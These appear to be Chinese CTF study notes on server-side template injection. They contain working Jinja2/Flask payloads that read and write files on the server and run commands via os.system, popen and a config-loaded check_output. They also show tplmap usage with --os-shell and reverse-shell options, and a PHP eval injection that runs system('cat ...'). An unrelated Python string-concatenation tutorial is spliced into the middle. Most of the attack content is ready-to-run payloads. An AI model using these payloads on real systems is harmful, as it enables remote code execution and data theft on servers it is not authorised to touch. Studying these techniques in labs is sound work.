http://127.0.0.1:5000/
http://127.0.0.1:5000/hello/world
http://127.0.0.1:5000/page_never_exist
http://127.0.0.1:5000/page_never_exist{{1+1}}
http://127.0.0.1:5000/hello/122<script>alert(1)</script>
http://127.0.0.1:5000/page_never_exist/<script>alert(1)</script>

http://127.0.0.1:5000/page_never_exist/{{config}}
http://127.0.0.1:5000/page_never_exist/{{self.__dict__}}
······

#http://127.0.0.1:5000/page_never_exist/{{''.__class__.__mro__[1].__subclasses__()[100].get_data(0, 'C://Windows//win.ini')}}
http://127.0.0.1:5000/page_never_exist/{{''.__class__.__mro__[2].__subclasses__()[40]('C://Windows//win.ini').read()}}
http://127.0.0.1:5000/page_never_exist/{{''.__class__.__mro__[2].__subclasses__()[40]('C://桌面路径//test.txt', 'w').write('hello')}}

http://127.0.0.1:5000/page_never_exist/{{''.__class__.__mro__[2].__subclasses__()[40]('C://Users//luke10481//Desktop//test.py', 'w').write('from subprocess import check_output ;RUNCMD = check_output;')}}
http://127.0.0.1:5000/page_never_exist/{{config.from_pyfile('C://Users//luke10481//Desktop//test.py')}}
http://127.0.0.1:5000/page_never_exist/{{config['RUNCMD']('calc')}}

http://127.0.0.1:5000/page_never_exist/{{().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals['linecache'].__dict__['os'].__dict__['system']('calc')}}

服务器端模板注入是指攻击者能够使用模板语法将恶意有效负载注入模板，然后在服务器端执行该模板。注入任意模板指令以操纵模板引擎，使他们能够完全控制服务器。
模板引擎旨在通过将固定模板与易变数据相结合来生成网页。当用户输入的内容直接连接到模板中，而不是作为数据传递时，可能会发生服务器端模板注入攻击。

"""
1. 使用加号“+”连接字符串

    用加号“+”连接两个字符串，连接后这两个字符串将连接成一个字符串。但需注意的是，
不能用“+”连接字符串和数字，需要把数字使用str()函数转换成字符串，或者直接在数字两侧加带引号，再进行连接、
"""
str11 = "hello"
str12 = "world"
str13 = str11 + str12
print(str13)         # helloworld
""" 注： 但在python中，尽量少用加号“+”连接字符串，原因如下：在python中，String对象是定长对象，一旦创建，长度就不可变化，若是使用+号连接两个字符串，则会新开辟一段长度总和长度的内存，再将两个字符串memcpy进去。如果要连接N个String对象，则要进行N-1次内存申请和拷贝。 官方推荐的是使用字符串的join方法，该方法对于连接一个list或tuple中的元素非常有效，它会先统计所有元素的长度，申请内存，然后拷贝。 """
"""
2. 使用逗号连接字符串
    python可用逗号“，”将多个字符串连接为一个元组，再通过join()方法将元组中的各个元素连接为一个字符串，
从而达到连接字符串的目的。若是直接将字符串逗号连接后print，字符串之间会多一个空格。
"""
str21 = "hello"
str22 = "world"
str23 = str21, str22

print(str21, str22)       # hello world

print(str23)              # ('hello', 'world')
print(''.join(str23))
"""
3. 直接连接字符串
    python独有的方法。只要把两个字符串放在一起，无论中间有空白或没有空白，
两个字符串将自动连接为一个字符串(空格不会自动去掉).
"""
print("hello" "world")      # helloworld
"""
4. 格式化方式拼接（ % ， format）
   符号“%”,{} 连接一个字符串和一组变量，字符串中的特殊标记会被自动用右边变量组中的变量进行替换.
（字符串之间会有空格隔开）
"""
print('%s %s %s' % ('我', '是', '中国人'))     # 我 是 中国人

print("{} {} {}".format('我', '是', '中国人'))
"""
5. 通过join()函数连接字符串
   利用字符串函数 join()，它是 split() 方法的逆方法。这个函数接收一个列表，
然后用字符串依次连接列表中每一个元素，其类似方法2的最后一步
"""
lists = ['hello', 'world']
print('_'.join(lists))       # hello_world


 tplmap的安装和使用
tpl是用python2编写的,报错一般是使用py3

==kali下安装tplmap 可以参考一下这篇博文 https://www.cnblogs.com/ktsm/p/15691652.html ==
以下操作均在centos7的环境下操作,debian ubuntu适用

1.1 使用git克隆tplmap
git clone https://github.com/epinna/tplmap

cd tplmap

sudo yum install python-pip -y||sudo apt install python-pip #安装py2的pip

pip install -r requirements.txt
1.2 操作实例
#探测注入点
./tplmap.py -u 'http://114.67.246.176:17787/?flag'


#获取shell
./tplmap.py -u 'http://114.67.246.176:17787/?flag' --os-shell
1.3 详细命令

--os-shell                          Run shell on the target
--os-cmd                            Execute shell commands
--bind-shell PORT                   Connect to a shell bind to a target port
--reverse-shell HOST PORT   Send a shell back to the attacker's port
--upload LOCAL REMOTE       Upload files to the server
--download REMOTE LOCAL     Download remote files

2. python flask框架模板注入
2.1 手动注入
查看根目录(ctf简单的题目flag一般在根目录)

http://114.67.246.176:17130/?flag={{ config.__class__.__init__.__globals__['os'].popen('ls /').read() }}
网页明文显示

image-20211027212203187

一般的linux根目录如下

image-20211027212249912

显然app是用户新增的目录, 接下来进入它, 看能不能找到flag

http://114.67.246.176:17130/?flag={{ config.class.init.globals['os'].popen('cd app&& ls').read() }}
运气不错, 直接爆出来了flag

image-20211027212516344

http://114.67.246.176:17130/?flag={{ config.class.init.globals['os'].popen('cat flag').read() }}
http://114.67.175.224:16538/?flag={{%20config.__class__.__init__.__globals__[%27os%27].popen(%27cat%20../app/flag%27).read()%20}}
flag就不贴了, 大家自己尝试一下吧.

2.2 自动注入
直接使用上面介绍的tplmap进行自动注入!!!

./tplmap.py -u 'http://114.67.246.176:17787/?flag' --os-shell
3. php应用实例
extract()
解析传入的值

extract($_GET);
extract($_POST);
error_reporting() 函数
<?php
 // 关闭错误报告
 error_reporting(0);

 // 报告 runtime 错误
 error_reporting(E_ERROR | E_WARNING | E_PARSE);

 // 报告所有错误
 error_reporting(E_ALL);

 // 等同 error_reporting(E_ALL);
 ini_set("error_reporting", E_ALL);

 // 报告 E_NOTICE 之外的所有错误
 error_reporting(E_ALL & ~E_NOTICE);
?> 
题目
<?php
highlight_file('index.php');

extract($_GET);
error_reporting(0);
function String2Array($data)
{
    if($data == '') return array();
    @eval("\$array = $data;");
    return $array;
}


if(is_array($attrid) && is_array($attrvalue))
{
    $attrstr .= 'array(';
    $attrids = count($attrid);
    for($i=0; $i<$attrids; $i++)
    {
        $attrstr .= '"'.intval($attrid[$i]).'"=>'.'"'.$attrvalue[$i].'"';
        if($i < $attrids-1)
        {
            $attrstr .= ',';
        }
    }
    $attrstr .= ');';
}

String2Array($attrstr);
解法
构造url进行注入获取权限

?attrid[0]=1&attrvalue[0]=1&attrstr=phpinfo();
丢进tplmap获取shell权限

cd ~/tplmap/tplmap
python tplmap -u "http://dd99644f-c8ac-4214-9d37-0699eea59b19.node4.buuoj.cn:81/" --os-shell
原理
eval函数会执行php函数
eval() 函数把字符串按照 PHP 代码来计算。

该字符串必须是合法的 PHP 代码，且必须以分号结尾。

如果没有在代码字符串中调用 return 语句，则返回 NULL。如果代码中存在解析错误，则 eval() 函数返回 false。
system函数
注意，system()会将shell命令执行之后，立马显示结果，这一点会比较不方便，因为我们有时候不需要结果立马输出，甚至不需要输出，于是可以用到exec()

所以执行以下url

cf307529-9fc9-409e-a14b-7a4c0d2d8a3d.node4.buuoj.cn:81/?attrid[0]=1&attrvalue[0]=1&attrstr=system(%27cat%20//etc/timezone%27);
得到flag